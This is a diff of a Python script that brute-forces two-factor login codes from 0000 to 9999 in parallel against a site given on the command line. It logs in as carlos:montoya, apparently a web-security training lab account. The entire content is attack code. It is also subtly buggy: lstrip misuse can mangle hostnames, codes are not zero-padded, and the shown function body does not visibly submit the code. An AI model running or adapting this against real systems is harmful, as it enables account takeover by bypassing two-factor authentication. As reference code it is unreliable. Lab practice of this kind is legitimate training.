@@ -14,7 +14,10 @@ def Check_Second_Factor_Code(code_to_check):
         print(f'2fa invalid with response code: {code_to_check}')
 
 
-def Login_to_account(site, factor_code):
+def Login_to_account(factor_code):
+    site = sys.argv[1]
+    if 'https://' in site:
+        site = site.rstrip('/').lstrip('https://')
 
     s = requests.Session()
     login_url = f'https://{site}/login'
@@ -29,6 +32,7 @@ def Login_to_account(site, factor_code):
         'password': 'montoya'
     }
     print(f'Logging in as carlos:montoya')
+    print(f'Using 2FA code: {factor_code}')
     resp = s.post(login_url, data=logindata)
     print(f'Login response: {resp.text}')
 
@@ -46,15 +50,11 @@ def Login_to_account(site, factor_code):
 
 if __name__ == '__main__':
 
-    site = sys.argv[1]
-    if 'https://' in site:
-        site = site.rstrip('/').lstrip('https://')
-
     # Generate a list of 0-9999
-    factor_code_list = list(range(0, 10000))
+    factor_code_list = list(i for i in range(10000))
     # Get a multiple of CPU Count going of workers, in my case 96
     workers = multiprocessing.cpu_count() * 4
     # workers = np.array_split(factor_code_list, workers)
-    # print(workers)
-    with multiprocessing.pool(workers) as w:
-        Login_to_account(site, factor_code_list)
+    print(factor_code_list)
+    with multiprocessing.Pool(workers) as w:
+        w.map(Login_to_account, factor_code_list)
